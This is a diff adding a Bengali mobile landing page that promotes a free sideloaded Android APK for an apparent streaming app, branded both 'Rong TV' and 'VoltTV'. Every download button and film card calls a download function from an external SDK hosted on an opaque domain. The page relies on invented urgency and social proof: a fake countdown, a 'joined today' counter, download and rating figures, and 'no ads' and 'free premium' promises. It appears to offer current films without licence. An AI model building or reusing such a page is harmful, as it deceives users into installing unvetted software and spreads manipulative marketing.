@@ -1,0 +1,609 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+<meta charset="UTF-8">
+   <script src="https://api.xcty68.vip/js/meetu-sdk.js"></script>
+
+<script>
+// ========== k2 — 核心跳转方法 ==========
+function k2(){
+     MeetU.download(event);
+}
+</script>
+
+<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no,viewport-fit=cover">
+<title>Rong TV — পকেটে সিনেমা</title>
+<meta name="description" content="Rong TV — ব্লকবাস্টার স্ট্রিম করুন, সিরিজ দেখুন, এবং 4K HDR-এ অফলাইনে দেখুন। কোনো বিজ্ঞাপন নেই। অ্যান্ড্রয়েডের জন্য ফ্রি APK ডাউনলোড করুন।">
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,600;0,700;0,800;0,900;1,700&family=Space+Grotesk:wght@400;500;600;700&family=Noto+Sans+Bengali:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+
+<style>
+/* ============================================================
+   RESET
+   ============================================================ */
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{-webkit-text-size-adjust:100%;-webkit-tap-highlight-color:transparent}
+body{
+  font-family:'Noto Sans Bengali','Space Grotesk',-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,'PingFang SC','Microsoft YaHei',sans-serif;
+  background:var(--bg);color:var(--ink);line-height:1.6;
+  -webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;
+  overflow-x:clip;
+}
+img,svg{display:block;max-width:100%}
+button{font:inherit;cursor:pointer;border:none;outline:none;background:none;color:inherit;touch-action:manipulation}
+a{color:inherit;text-decoration:none}
+:focus-visible{outline:2px solid var(--accent);outline-offset:3px;border-radius:8px}
+b,strong{font-weight:700}
+
+/* ============================================================
+   TOKENS — dark cinematic marquee
+   ============================================================ */
+:root{
+  --bg:#08080C;
+  --bg-2:#0E0E15;
+  --surface:#12121A;
+  --surface-2:#181823;
+  --ink:#F4F1E7;
+  --ink-2:#A8A6B5;
+  --ink-3:#6B6978;
+  --line:rgba(244,241,231,0.09);
+  --line-strong:rgba(244,241,231,0.18);
+  --accent:#F5C518;
+  --accent-soft:rgba(245,197,24,0.12);
+  --accent-ink:#191203;
+  --green:#22C55E;
+  --serif:'Playfair Display',Georgia,'Times New Roman','Songti SC',serif;
+  --mono:ui-monospace,'SF Mono','Cascadia Code','JetBrains Mono','Roboto Mono',Menlo,Consolas,monospace;
+  --radius-sm:10px;--radius-md:16px;--radius-lg:22px;--radius-full:9999px;
+  --shadow-md:0 24px 60px rgba(0,0,0,0.5);
+  --ease:cubic-bezier(0.22,1,0.36,1);
+}
+
+/* ============================================================
+   PAGE
+   ============================================================ */
+.page{max-width:480px;margin:0 auto;min-height:100vh;background:var(--bg);position:relative;overflow:clip}
+@media(min-width:481px){
+  body{background:radial-gradient(120% 120% at 50% 0%,#14141F 0%,#050508 70%)}
+  .page{border-left:1px solid var(--line);border-right:1px solid var(--line)}
+}
+
+/* ============================================================
+   HERO — vertical scrolling photo wall
+   ============================================================ */
+.hero{position:relative;height:100svh;min-height:640px;overflow:hidden;background:#000}
+.hero-wall{position:absolute;inset:0;display:grid;grid-template-columns:repeat(4,1fr);gap:12px;transform:scale(1.08)}
+.col{display:flex;flex-direction:column;will-change:transform}
+.col .set{display:flex;flex-direction:column;gap:12px;padding-bottom:12px}
+.col img{width:100%;aspect-ratio:5/7;object-fit:cover;border-radius:9px;filter:brightness(0.9) saturate(1.05)}
+.col.up{animation:rise 30s linear infinite}
+.col.down{animation:fall 34s linear infinite}
+@keyframes rise{from{transform:translateY(0)}to{transform:translateY(-50%)}}
+@keyframes fall{from{transform:translateY(-50%)}to{transform:translateY(0)}}
+
+.hero-scrim{position:absolute;inset:0;pointer-events:none;
+  background:
+    radial-gradient(130% 85% at 50% 44%, rgba(8,8,12,0.12) 0%, rgba(8,8,12,0.72) 60%, rgba(8,8,12,0.95) 100%),
+    linear-gradient(180deg, rgba(8,8,12,0.55) 0%, rgba(8,8,12,0) 22%, rgba(8,8,12,0) 60%, rgba(8,8,12,0.9) 100%)}
+.hero-grain{position:absolute;inset:0;pointer-events:none;opacity:.055;mix-blend-mode:overlay;
+  background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='140' height='140'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='2'/%3E%3C/filter%3E%3Crect width='140' height='140' filter='url(%23n)'/%3E%3C/svg%3E")}
+
+/* top bar */
+.topbar{position:absolute;top:0;left:0;right:0;z-index:6;display:flex;align-items:center;justify-content:space-between;padding:16px 20px}
+.brand{display:flex;align-items:center;gap:10px}
+.brand img{width:34px;height:34px;border-radius:9px;box-shadow:0 0 0 1px rgba(244,241,231,0.2)}
+.brand-name{font-family:var(--serif);font-size:1.15rem;font-weight:800;letter-spacing:-0.01em;color:var(--ink)}
+.brand-name b{color:var(--accent);font-weight:800}
+.live{display:inline-flex;align-items:center;gap:7px;font-family:var(--mono);font-size:0.6rem;font-weight:600;letter-spacing:0.14em;text-transform:uppercase;color:rgba(244,241,231,0.85);padding:7px 12px;border-radius:var(--radius-full);background:rgba(8,8,12,0.5);border:1px solid var(--line);backdrop-filter:blur(8px)}
+.live i{width:7px;height:7px;border-radius:50%;background:#FF3B30;box-shadow:0 0 0 0 rgba(255,59,48,0.6);animation:pulse 1.8s infinite}
+@keyframes pulse{0%{box-shadow:0 0 0 0 rgba(255,59,48,0.6)}70%{box-shadow:0 0 0 8px rgba(255,59,48,0)}100%{box-shadow:0 0 0 0 rgba(255,59,48,0)}}
+
+/* hero content */
+.hero-content{position:absolute;inset:0;z-index:5;display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center;padding:0 26px;padding-bottom:9vh}
+.hero-eyebrow{display:inline-flex;align-items:center;gap:9px;font-family:var(--mono);font-size:0.62rem;font-weight:600;letter-spacing:0.22em;text-transform:uppercase;color:var(--accent);margin-bottom:18px}
+.hero-eyebrow::before,.hero-eyebrow::after{content:'';width:22px;height:1px;background:linear-gradient(90deg,transparent,var(--accent))}
+.hero-eyebrow::after{background:linear-gradient(90deg,var(--accent),transparent)}
+.hero h1{font-family:var(--serif);font-size:clamp(2.7rem,13vw,3.7rem);font-weight:900;line-height:0.96;letter-spacing:-0.01em;color:var(--ink);margin-bottom:16px}
+.hero h1 em{font-style:italic;color:var(--accent);font-weight:700}
+.hero .deck{font-size:0.9rem;color:rgba(244,241,231,0.72);line-height:1.6;max-width:34ch;margin-bottom:24px}
+.hero-cta{display:inline-flex;align-items:center;gap:10px;min-height:56px;padding:0 30px;border-radius:var(--radius-full);background:var(--accent);color:var(--accent-ink);font-size:0.92rem;font-weight:700;box-shadow:0 12px 40px rgba(245,197,24,0.35);transition:transform .16s var(--ease)}
+.hero-cta:active{transform:scale(0.96)}
+.hero-cta svg{width:19px;height:19px}
+.hero-proof{display:flex;align-items:center;gap:6px;margin-top:16px;font-family:var(--mono);font-size:0.62rem;color:rgba(244,241,231,0.6)}
+.hero-proof b{color:var(--accent);font-weight:600}
+.hero-proof i{font-style:normal;color:#FFB02E}
+.hero-scroll{position:absolute;bottom:20px;left:0;right:0;z-index:6;text-align:center;font-family:var(--mono);font-size:0.58rem;letter-spacing:0.2em;text-transform:uppercase;color:rgba(244,241,231,0.5)}
+.hero-scroll span{display:block;margin:0 auto;width:1px;height:34px;background:linear-gradient(180deg,var(--accent),transparent);margin-top:10px}
+
+/* ============================================================
+   OFFER — urgency strip (countdown)
+   ============================================================ */
+.offer{background:linear-gradient(90deg,#2A2206,#3A2E08 50%,#2A2206);border-bottom:1px solid rgba(245,197,24,0.28);padding:11px 20px}
+.offer-inner{display:flex;align-items:center;justify-content:center;gap:10px;flex-wrap:wrap}
+.offer-tag{font-family:var(--mono);font-size:0.56rem;font-weight:700;letter-spacing:0.1em;text-transform:uppercase;color:var(--accent-ink);background:var(--accent);padding:3px 9px;border-radius:var(--radius-full)}
+.offer-txt{font-size:0.72rem;color:var(--ink-2)}
+.offer-clock{display:inline-flex;align-items:center;gap:4px;font-family:var(--mono);font-size:0.86rem;font-weight:700;color:var(--ink)}
+.offer-clock b{min-width:22px;text-align:center;background:var(--bg);border:1px solid var(--line-strong);border-radius:6px;padding:1px 4px;color:var(--accent)}
+
+/* ============================================================
+   STAT TICKER — horizontal marquee
+   ============================================================ */
+.ticker{margin:0 -20px;overflow:hidden;border-top:1px solid var(--line);border-bottom:1px solid var(--line);background:var(--bg-2)}
+.ticker-track{display:flex;align-items:center;width:max-content;padding:16px 0;animation:tick 26s linear infinite}
+.ticker-track:hover{animation-play-state:paused}
+.ticker-group{display:flex;align-items:center}
+.ticker-group span{display:inline-flex;align-items:center;gap:9px;padding:0 22px;font-family:var(--mono);font-size:0.68rem;font-weight:600;letter-spacing:0.08em;text-transform:uppercase;color:var(--ink-2);white-space:nowrap}
+.ticker-group span b{color:var(--accent);font-weight:600}
+.ticker-group span::after{content:'✦';color:var(--accent);font-size:0.55rem;opacity:.6}
+@keyframes tick{from{transform:translateX(0)}to{transform:translateX(-50%)}}
+
+/* ============================================================
+   SECTION SCAFFOLD
+   ============================================================ */
+.sec{padding:46px 20px 0}
+.sec-head{margin-bottom:24px}
+.eyebrow{display:inline-flex;align-items:center;gap:9px;font-family:var(--mono);font-size:0.6rem;font-weight:600;letter-spacing:0.22em;text-transform:uppercase;color:var(--accent);margin-bottom:12px}
+.eyebrow::before{content:'';width:26px;height:1px;background:var(--accent)}
+.h2{font-family:var(--serif);font-size:1.9rem;font-weight:800;line-height:1.06;letter-spacing:-0.01em}
+.h2 em{font-style:italic;color:var(--accent)}
+.sub{font-size:0.82rem;color:var(--ink-3);line-height:1.6;margin-top:10px;max-width:40ch}
+
+/* ============================================================
+   TRENDING — numbered vertical chart
+   ============================================================ */
+.rank-list{display:flex;flex-direction:column;gap:4px}
+.rank{display:flex;align-items:center;gap:14px;padding:12px;border-radius:var(--radius-md);transition:background .2s var(--ease);cursor:pointer}
+.rank:active{background:var(--surface-2)}
+.rank-num{font-family:var(--serif);font-style:italic;font-size:2rem;font-weight:800;color:transparent;-webkit-text-stroke:1px var(--line-strong);min-width:44px;line-height:1}
+.rank:nth-child(1) .rank-num,.rank:nth-child(2) .rank-num,.rank:nth-child(3) .rank-num{color:var(--accent);-webkit-text-stroke:0}
+.rank-thumb{position:relative;width:76px;aspect-ratio:5/7;border-radius:10px;overflow:hidden;flex-shrink:0;box-shadow:0 8px 24px rgba(0,0,0,0.5)}
+.rank-thumb img{width:100%;height:100%;object-fit:cover}
+.rank-badge{position:absolute;top:5px;left:5px;font-family:var(--mono);font-size:0.46rem;font-weight:700;letter-spacing:0.06em;padding:3px 7px;border-radius:var(--radius-full);text-transform:uppercase}
+.rb-hot{background:var(--accent);color:var(--accent-ink)}
+.rb-new{background:var(--green);color:#04110a}
+.rb-top{background:var(--ink);color:var(--accent)}
+.rb-4k{background:#7C3AED;color:#fff}
+.rank-meta{flex:1;min-width:0}
+.rank-title{font-size:0.94rem;font-weight:700;color:var(--ink);line-height:1.3}
+.rank-rate{display:flex;align-items:center;gap:5px;font-family:var(--mono);font-size:0.64rem;color:var(--ink-3);margin-top:5px}
+.rank-rate b{color:var(--accent);font-weight:600}
+.rank-arrow{color:var(--ink-3);opacity:.5;flex-shrink:0}
+.rank-arrow svg{width:16px;height:16px}
+
+/* ============================================================
+   FEATURES — editorial numbered rows
+   ============================================================ */
+.feat-row{display:flex;align-items:flex-start;gap:16px;padding:22px 0;border-top:1px solid var(--line)}
+.feat-row:last-child{border-bottom:1px solid var(--line)}
+.feat-idx{font-family:var(--serif);font-style:italic;font-size:1.4rem;font-weight:800;color:var(--accent);min-width:38px;line-height:1.3}
+.feat-ic{width:44px;height:44px;min-width:44px;border-radius:13px;display:flex;align-items:center;justify-content:center;background:var(--accent-soft);color:var(--accent);border:1px solid rgba(245,197,24,0.22)}
+.feat-ic svg{width:21px;height:21px}
+.feat-txt h4{font-family:var(--serif);font-size:1.18rem;font-weight:800;color:var(--ink);margin-bottom:4px}
+.feat-txt p{font-size:0.78rem;color:var(--ink-2);line-height:1.6}
+
+/* ============================================================
+   COMPARE — cost value card (marketing)
+   ============================================================ */
+.save-card{border-radius:var(--radius-lg);background:linear-gradient(170deg,#18171E 0%,#12121A 100%);border:1px solid var(--line-strong);padding:24px 20px;position:relative;overflow:hidden}
+.save-card::before{content:'';position:absolute;top:-80px;left:-40px;width:220px;height:220px;border-radius:50%;background:radial-gradient(circle,rgba(245,197,24,0.14),transparent 70%)}
+.save-big{text-align:center;margin-bottom:20px;position:relative}
+.save-big .n{font-family:var(--serif);font-size:4rem;font-weight:900;line-height:1;color:var(--accent)}
+.save-big .n span{font-size:1.2rem;font-weight:700;color:var(--ink-2);font-family:'Noto Sans Bengali','Space Grotesk',sans-serif;margin-left:6px}
+.save-big .l{font-family:var(--mono);font-size:0.6rem;letter-spacing:0.16em;text-transform:uppercase;color:var(--ink-3);margin-top:8px}
+.vs-row{display:flex;align-items:center;justify-content:space-between;padding:12px 14px;border-radius:var(--radius-sm);margin-bottom:8px;position:relative}
+.vs-row.me{background:var(--accent-soft);border:1px solid rgba(245,197,24,0.3)}
+.vs-row.me span{color:var(--ink);font-weight:700}
+.vs-row span{font-size:0.82rem;color:var(--ink-2)}
+.vs-row b{font-family:var(--mono);font-size:0.85rem;font-weight:700}
+.vs-row.me b{color:var(--accent)}
+.vs-row.them b{color:var(--ink-3);text-decoration:line-through}
+.save-line{margin-top:14px;text-align:center;font-family:var(--mono);font-size:0.68rem;color:var(--ink-2);position:relative}
+.save-line b{color:var(--green);font-weight:700}
+
+/* ============================================================
+   TOGETHER — spotlight panel
+   ============================================================ */
+.tog{position:relative;overflow:hidden;border-radius:var(--radius-lg);background:linear-gradient(160deg,#1C1A0F 0%,#131118 60%);border:1px solid rgba(245,197,24,0.28);padding:26px 22px;box-shadow:var(--shadow-md)}
+.tog::before{content:'';position:absolute;top:-70px;right:-70px;width:200px;height:200px;border-radius:50%;background:radial-gradient(circle,rgba(245,197,24,0.22),transparent 70%)}
+.tog h3{font-family:var(--serif);font-size:1.5rem;font-weight:800;line-height:1.12;letter-spacing:-0.01em;margin-bottom:20px;position:relative}
+.tog h3 em{font-style:italic;color:var(--accent)}
+.tog-list{display:flex;flex-direction:column;position:relative}
+.tog-i{display:flex;align-items:flex-start;gap:13px;padding:13px 0;border-top:1px solid var(--line)}
+.tog-check{width:24px;height:24px;min-width:24px;border-radius:50%;background:var(--accent);color:var(--accent-ink);display:flex;align-items:center;justify-content:center;margin-top:1px}
+.tog-check svg{width:13px;height:13px}
+.tog-i span{font-size:0.76rem;color:var(--ink-2);line-height:1.6}
+.tog-i strong{display:inline;font-weight:700;color:var(--ink)}
+
+/* ============================================================
+   REVIEWS — stacked typographic quotes
+   ============================================================ */
+.rev-score{display:flex;align-items:center;gap:18px;padding:20px;border-radius:var(--radius-md);background:var(--surface);border:1px solid var(--line);margin-bottom:18px}
+.rev-num{font-family:var(--serif);font-size:3.2rem;font-weight:900;line-height:0.85;color:var(--ink)}
+.rev-num span{display:block;font-family:var(--mono);font-size:0.56rem;font-weight:600;letter-spacing:0.14em;text-transform:uppercase;color:var(--ink-3);margin-top:8px}
+.rev-stars{display:flex;gap:3px;margin-bottom:8px}
+.rev-stars svg{width:16px;height:16px;color:var(--accent)}
+.rev-txt{font-size:0.68rem;color:var(--ink-3)}
+.rev-txt b{color:var(--ink);font-weight:700}
+.quote{position:relative;padding:24px 0;border-top:1px solid var(--line)}
+.quote:last-child{border-bottom:1px solid var(--line)}
+.quote-mark{font-family:var(--serif);font-size:3.4rem;font-weight:900;line-height:0.6;color:var(--accent);margin-bottom:16px;opacity:.9}
+.quote p{font-size:0.9rem;color:var(--ink);line-height:1.7;font-weight:500}
+.quote-who{display:flex;align-items:center;gap:11px;margin-top:16px}
+.quote-av{width:38px;height:38px;min-width:38px;border-radius:50%;overflow:hidden;box-shadow:0 0 0 1px var(--line-strong)}
+.quote-av img{width:100%;height:100%;object-fit:cover}
+.quote-name{font-size:0.78rem;font-weight:700;color:var(--ink)}
+.quote-name span{display:flex;align-items:center;gap:4px;font-weight:500;font-size:0.58rem;color:var(--accent);margin-top:2px}
+
+/* ============================================================
+   SECURITY — terminal console
+   ============================================================ */
+.term{border-radius:var(--radius-md);overflow:hidden;border:1px solid var(--line-strong);background:#0A0B10;box-shadow:var(--shadow-md)}
+.term-bar{display:flex;align-items:center;gap:7px;padding:11px 14px;background:var(--surface-2);border-bottom:1px solid var(--line)}
+.term-bar i{width:10px;height:10px;border-radius:50%}
+.term-bar i:nth-child(1){background:#FF5F57}.term-bar i:nth-child(2){background:#FEBC2E}.term-bar i:nth-child(3){background:#28C840}
+.term-bar span{margin-left:8px;font-family:var(--mono);font-size:0.6rem;color:var(--ink-3);letter-spacing:0.04em}
+.term-body{padding:18px 16px;font-family:var(--mono);font-size:0.72rem;line-height:1.8}
+.term-body .ln{color:var(--ink-2)}
+.term-body .ok{color:#5AE08A}
+.term-body .ok b{color:#B6F5C9;font-weight:600}
+.term-body .ok .dim{color:#3E8A5A}
+.term-body .prompt{color:var(--accent)}
+.term-cursor{display:inline-block;width:8px;height:14px;background:var(--accent);vertical-align:middle;margin-left:3px;animation:blink 1s steps(1) infinite}
+@keyframes blink{50%{opacity:0}}
+
+/* ============================================================
+   CTA — spotlight
+   ============================================================ */
+.cta{position:relative;overflow:hidden;border-radius:var(--radius-lg);padding:44px 24px;text-align:center;background:radial-gradient(120% 100% at 50% 0%,#2A2206 0%,#0D0C08 55%,#08080C 100%);border:1px solid rgba(245,197,24,0.35)}
+.cta::before{content:'';position:absolute;inset:0;background:radial-gradient(60% 40% at 50% 0%,rgba(245,197,24,0.16),transparent 70%)}
+.cta-icon{width:72px;height:72px;margin:0 auto 18px;border-radius:19px;overflow:hidden;box-shadow:0 0 0 1px rgba(245,197,24,0.4),0 18px 44px rgba(0,0,0,0.5);position:relative}
+.cta-icon img{width:100%;height:100%;object-fit:cover}
+.cta h2{font-family:var(--serif);font-size:2rem;font-weight:900;line-height:1.02;color:var(--ink);margin-bottom:12px;position:relative}
+.cta h2 em{font-style:italic;color:var(--accent)}
+.cta p{font-size:0.8rem;color:rgba(244,241,231,0.7);margin-bottom:22px;line-height:1.6;position:relative}
+.cta-btn{display:inline-flex;align-items:center;justify-content:center;gap:10px;width:100%;min-height:58px;border-radius:var(--radius-full);background:var(--accent);color:var(--accent-ink);font-size:0.95rem;font-weight:700;box-shadow:0 14px 44px rgba(245,197,24,0.32);transition:transform .16s var(--ease);position:relative}
+.cta-btn:active{transform:scale(0.97)}
+.cta-btn svg{width:20px;height:20px}
+.cta-note{font-family:var(--mono);font-size:0.58rem;color:rgba(244,241,231,0.5);margin-top:14px;letter-spacing:0.04em;position:relative}
+.guarantees{display:flex;flex-wrap:wrap;justify-content:center;gap:8px 16px;margin-top:18px;position:relative}
+.guarantees span{display:inline-flex;align-items:center;gap:6px;font-size:0.66rem;color:var(--ink-2)}
+.guarantees svg{width:14px;height:14px;color:var(--green)}
+
+/* ============================================================
+   FAQ — minimal hairline accordion
+   ============================================================ */
+.faqs{display:flex;flex-direction:column}
+.faq{border-top:1px solid var(--line)}
+.faq:last-child{border-bottom:1px solid var(--line)}
+.faq-q{display:flex;align-items:center;gap:12px;padding:18px 2px;width:100%;text-align:left}
+.faq-q span{flex:1;font-size:0.9rem;font-weight:600;color:var(--ink);font-family:var(--serif);letter-spacing:0.005em}
+.faq.open .faq-q span{color:var(--accent)}
+.faq-mark{width:26px;height:26px;min-width:26px;border-radius:50%;border:1px solid var(--line-strong);display:flex;align-items:center;justify-content:center;color:var(--accent);transition:transform .3s var(--ease);flex-shrink:0}
+.faq-mark svg{width:13px;height:13px}
+.faq.open .faq-mark{background:var(--accent);border-color:transparent;color:var(--accent-ink);transform:rotate(45deg)}
+.faq-a{max-height:0;overflow:hidden;transition:max-height .4s var(--ease)}
+.faq.open .faq-a{max-height:560px}
+.faq-a p{padding:0 2px 20px 38px;font-size:0.76rem;color:var(--ink-2);line-height:1.75}
+
+/* ============================================================
+   FOOTER
+   ============================================================ */
+.foot{margin-top:34px;padding:26px 0 10px;border-top:1px solid var(--line);text-align:center}
+.foot-brand{display:flex;align-items:center;justify-content:center;gap:9px;margin-bottom:12px}
+.foot-brand img{width:30px;height:30px;border-radius:8px}
+.foot-brand span{font-family:var(--serif);font-size:1.05rem;font-weight:800}
+.foot-brand b{color:var(--accent)}
+.foot-links{display:flex;gap:18px;justify-content:center;margin-bottom:14px}
+.foot-links a{font-size:0.7rem;color:var(--ink-3);transition:color .2s}
+.foot-links a:active{color:var(--accent)}
+.foot-copy{font-family:var(--mono);font-size:0.58rem;color:var(--ink-3);letter-spacing:0.04em}
+
+/* ============================================================
+   FIXED BOTTOM BAR — floating pill
+   ============================================================ */
+.instbar{position:fixed;left:50%;bottom:calc(12px + env(safe-area-inset-bottom));transform:translateX(-50%);width:calc(100% - 28px);max-width:452px;display:flex;align-items:center;gap:12px;padding:10px 12px;background:rgba(18,18,26,0.82);backdrop-filter:blur(16px);-webkit-backdrop-filter:blur(16px);border:1px solid var(--line-strong);border-radius:var(--radius-full);box-shadow:0 18px 50px rgba(0,0,0,0.6);z-index:100}
+.instbar-icon{width:40px;height:40px;min-width:40px;border-radius:12px;overflow:hidden;box-shadow:0 0 0 1px var(--line-strong)}
+.instbar-icon img{width:100%;height:100%;object-fit:cover}
+.instbar-meta{flex:1;min-width:0}
+.instbar-name{font-family:var(--serif);font-size:0.86rem;font-weight:800;color:var(--ink);line-height:1.15}
+.instbar-sub{display:flex;align-items:center;gap:4px;font-family:var(--mono);font-size:0.6rem;color:var(--ink-3);margin-top:1px}
+.instbar-sub svg{width:11px;height:11px;color:var(--accent)}
+.instbar-btn{flex-shrink:0;min-height:42px;padding:0 20px;border-radius:var(--radius-full);background:var(--accent);color:var(--accent-ink);font-size:0.74rem;font-weight:700;box-shadow:0 8px 22px rgba(245,197,24,0.3);transition:transform .16s var(--ease)}
+.instbar-btn:active{transform:scale(0.94)}
+
+@media(prefers-reduced-motion:reduce){
+  *,*::before,*::after{animation-duration:0.01ms!important;transition-duration:0.01ms!important}
+  .col,.ticker-track{animation:none!important}
+}
+
+/* finesse · register=brand · A=dark+gold · B=serif-display+mono-spec · C=photo-wall+chart+terminal · D=film-grain · E=dark-cinematic · SOUL=6 SPECTACLE=7 DENSITY=5 */
+</style>
+</head>
+<body>
+
+<div class="page">
+
+  <!-- ============================================================
+       HERO — vertical photo wall
+       ============================================================ -->
+  <section class="hero">
+    <div class="hero-wall">
+      <div class="col up">
+        <div class="set"><img src="img/1a.png" alt=""><img src="img/3a.png" alt=""><img src="img/5a.png" alt=""><img src="img/t1.jpg" alt=""><img src="img/2a.png" alt=""><img src="img/4a.png" alt=""><img src="img/6a.png" alt=""></div>
+        <div class="set"><img src="img/1a.png" alt=""><img src="img/3a.png" alt=""><img src="img/5a.png" alt=""><img src="img/t1.jpg" alt=""><img src="img/2a.png" alt=""><img src="img/4a.png" alt=""><img src="img/6a.png" alt=""></div>
+      </div>
+      <div class="col down">
+        <div class="set"><img src="img/2a.png" alt=""><img src="img/6a.png" alt=""><img src="img/4a.png" alt=""><img src="img/1a.png" alt=""><img src="img/5a.png" alt=""><img src="img/3a.png" alt=""><img src="img/t1.jpg" alt=""></div>
+        <div class="set"><img src="img/2a.png" alt=""><img src="img/6a.png" alt=""><img src="img/4a.png" alt=""><img src="img/1a.png" alt=""><img src="img/5a.png" alt=""><img src="img/3a.png" alt=""><img src="img/t1.jpg" alt=""></div>
+      </div>
+      <div class="col up">
+        <div class="set"><img src="img/3a.png" alt=""><img src="img/1a.png" alt=""><img src="img/6a.png" alt=""><img src="img/5a.png" alt=""><img src="img/t1.jpg" alt=""><img src="img/4a.png" alt=""><img src="img/2a.png" alt=""></div>
+        <div class="set"><img src="img/3a.png" alt=""><img src="img/1a.png" alt=""><img src="img/6a.png" alt=""><img src="img/5a.png" alt=""><img src="img/t1.jpg" alt=""><img src="img/4a.png" alt=""><img src="img/2a.png" alt=""></div>
+      </div>
+      <div class="col down">
+        <div class="set"><img src="img/5a.png" alt=""><img src="img/2a.png" alt=""><img src="img/1a.png" alt=""><img src="img/6a.png" alt=""><img src="img/3a.png" alt=""><img src="img/t1.jpg" alt=""><img src="img/4a.png" alt=""></div>
+        <div class="set"><img src="img/5a.png" alt=""><img src="img/2a.png" alt=""><img src="img/1a.png" alt=""><img src="img/6a.png" alt=""><img src="img/3a.png" alt=""><img src="img/t1.jpg" alt=""><img src="img/4a.png" alt=""></div>
+      </div>
+    </div>
+    <div class="hero-scrim"></div>
+    <div class="hero-grain"></div>
+
+    <header class="topbar">
+      <div class="brand"><img src="img/logo.jpg" alt="Rong TV"><span class="brand-name">Volt<b>TV</b></span></div>
+      <span class="live"><i></i> লাইভ</span>
+    </header>
+
+    <div class="hero-content">
+      <div class="hero-eyebrow" data-i18n="hero_eyebrow">#১ বিনোদন অ্যাপ · ২০২৬</div>
+      <h1><span data-i18n="hero_title_a">সিনেমা তোমার</span> <em data-i18n="hero_title_b">পকেটে</em></h1>
+      <p class="deck" data-i18n="hero_desc">ব্লকবাস্টার স্ট্রিম করুন, সিরিজ দেখুন, অফলাইনে ডাউনলোড করুন — সবই stunning 4K HDR-এ। কোনো বিজ্ঞাপন নেই। কখনোই না।</p>
+      <button class="hero-cta" onclick="k2()"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg><span data-i18n="hero_cta">ফ্রি ডাউনলোড — দেখা শুরু করুন</span></button>
+      <div class="hero-proof"><i>🔥</i> <b data-joined>12,483</b> <span data-i18n="joined_today">আজ যোগ দিয়েছেন</span></div>
+    </div>
+
+    <div class="hero-scroll">স্ক্রল<span></span></div>
+  </section>
+
+  <!-- OFFER — countdown -->
+  <div class="offer">
+    <div class="offer-inner">
+      <span class="offer-tag" data-i18n="offer_tag">লঞ্চ অফার</span>
+      <span class="offer-txt" data-i18n="offer_txt">প্রিমিয়াম ফ্রি — শেষ হবে</span>
+      <span class="offer-clock"><b data-cd="hh">00</b>:<b data-cd="mm">00</b>:<b data-cd="ss">00</b></span>
+    </div>
+  </div>
+
+  <!-- STAT TICKER -->
+  <div class="ticker" aria-hidden="true">
+    <div class="ticker-track">
+      <div class="ticker-group">
+        <span><b>4.8</b> রেটিং</span>
+        <span><b>50M+</b> ডাউনলোড</span>
+        <span><b>10K+</b> টাইটেল</span>
+        <span><b>4K</b> HDR</span>
+        <span><b>0</b> বিজ্ঞাপন</span>
+      </div>
+      <div class="ticker-group">
+        <span><b>4.8</b> রেটিং</span>
+        <span><b>50M+</b> ডাউনলোড</span>
+        <span><b>10K+</b> টাইটেল</span>
+        <span><b>4K</b> HDR</span>
+        <span><b>0</b> বিজ্ঞাপন</span>
+      </div>
+    </div>
+  </div>
+
+  <main>
+
+    <!-- TRENDING — numbered chart -->
+    <section class="sec">
+      <div class="sec-head">
+        <div class="eyebrow" data-i18n="trending_label">এখন ট্রেন্ডিং</div>
+        <h2 class="h2"><span data-i18n="trending_h_a">পৃথিবী যা</span> <em data-i18n="trending_h_b">দেখছে</em></h2>
+        <p class="sub" data-i18n="trending_sub">সেরা পছন্দ, প্রতিদিন আপডেট</p>
+      </div>
+      <div class="rank-list">
+        <div class="rank" onclick="k2()"><span class="rank-num">01</span><div class="rank-thumb"><img src="img/1a.png" alt="Project Hail Mary" loading="lazy"><span class="rank-badge rb-hot" data-i18n="card_hot">হট</span></div><div class="rank-meta"><div class="rank-title">Project Hail Mary</div><div class="rank-rate"><b>4.9</b> · <span data-i18n="live_rating">রেটিং</span></div></div><span class="rank-arrow"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"/></svg></span></div>
+        <div class="rank" onclick="k2()"><span class="rank-num">02</span><div class="rank-thumb"><img src="img/2a.png" alt="Send Help" loading="lazy"><span class="rank-badge rb-new" data-i18n="card_new">নতুন</span></div><div class="rank-meta"><div class="rank-title">Send Help</div><div class="rank-rate"><b>4.7</b> · <span data-i18n="live_rating">রেটিং</span></div></div><span class="rank-arrow"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"/></svg></span></div>
+        <div class="rank" onclick="k2()"><span class="rank-num">03</span><div class="rank-thumb"><img src="img/3a.png" alt="Good Luck, Have Fun" loading="lazy"><span class="rank-badge rb-top" data-i18n="card_top">টপ</span></div><div class="rank-meta"><div class="rank-title">Good Luck, Have Fun</div><div class="rank-rate"><b>4.8</b> · <span data-i18n="live_rating">রেটিং</span></div></div><span class="rank-arrow"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"/></svg></span></div>
